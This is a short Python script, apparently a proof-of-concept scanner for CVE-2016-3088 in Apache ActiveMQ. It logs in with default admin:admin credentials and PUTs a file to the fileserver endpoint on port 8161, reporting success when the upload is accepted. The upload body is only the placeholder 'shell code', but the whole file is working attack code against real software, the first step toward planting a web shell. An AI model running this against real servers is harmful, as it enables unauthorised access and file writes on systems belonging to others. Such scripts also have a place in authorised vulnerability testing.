import base64
import requests
requests.packages.urllib3.disable_warnings()
def run(url):
    """CVE-2016-3088 任意文件上传"""
    user='admin'
    pwd='admin'
    
    headers = {'Authorization' : 'Basic ' + base64.b64encode((user + ':' + pwd).encode()).decode()}
    data = "shell code"

    req = requests.put(url+':8161/fileserver/test.txt', headers=headers, data=data, timeout=3)
    if req.status_code == 204:
        return 'ActiveMQ put file success'
    else:
        return False